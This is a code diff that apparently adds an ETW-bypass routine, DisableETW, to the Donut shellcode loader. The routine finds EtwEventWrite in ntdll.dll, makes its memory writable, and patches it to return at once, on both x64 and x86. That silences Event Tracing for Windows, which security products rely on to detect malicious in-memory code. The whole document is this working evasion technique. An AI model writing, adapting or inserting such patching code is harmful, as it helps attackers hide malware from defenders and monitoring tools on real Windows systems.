@@ -372,3 +372,49 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     
 }
 #endif
+
+#if defined(BYPASS_ETW_A)
+#endif
+
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+    HMODULE dll;
+    DWORD   len, op, t;
+    LPVOID  cs;
+
+    // get a handle to ntdll.dll
+    dll = inst->api.LoadLibraryA(inst->ntdll);
+
+    // resolve address of EtwEventWrite
+    // if not found, return FALSE because it should exist
+    cs = inst->api.GetProcAddress(dll, inst->etwEventWrite);
+    if (cs == NULL) return FALSE;
+
+#ifdef _WIN64
+    // make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(
+        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Overwriting EtwEventWrite");
+
+    // over write with virtual address of stub
+    Memcpy(cs, "\xc3", 1);
+
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, 1, op, &t);
+#else
+    // make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(
+        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Overwriting EtwEventWrite");
+
+    // over write with virtual address of stub
+    Memcpy(cs, "\xc2\x14\x00\x00", 4);
+
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, 4, op, &t);
+#endif
+
+    return TRUE;
+
+}
